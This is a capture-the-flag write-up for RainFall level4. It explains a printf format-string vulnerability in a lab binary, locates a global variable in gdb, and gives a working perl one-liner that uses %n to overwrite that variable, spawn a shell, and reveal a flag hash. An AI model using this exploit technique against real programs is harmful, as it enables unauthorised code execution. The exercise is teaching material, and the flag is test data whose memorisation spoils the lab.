### Analysis

**In `main` :**
call to function `n()`

**In `n()` :**

`fgets` on `stdin` to a string `format` with a limited size of `0x200` characters
call to function `p()` which use this `format` string in `printf(format)` which is a vulnerability, referring to printf man
 ```
    Code such as printf(foo); often indicates a bug, since foo may
    contain a % character.  If foo comes from untrusted user input,
    it may contain %n, causing the printf() call to write to memory
    and creating a security hole.
 ```
and then it calls a `system("/bin/sh")` if the global variable `m` equal `0x1025544`

`m` adress:
```
(gdb) info variable
...
0x08049810  m
...
```
___

### Exploit

If we try to store a buffer `ABCD`, its done on the twelfth position
```
level4@RainFall:~$ perl -e 'print "ABCD %12\$x" . "\n"' | ./level4
ABCD 44434241
```

We change `m` value using its little endian adress `\x10\x98\x04\x08`
m must equal `0x1025544` which is 16930116, minus the 4 bytes of the address 16930112
```
level4@RainFall:~$ perl -e 'print "\x10\x98\x04\x08" . "%16930112d" . "%12\$n" . "\n"' | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```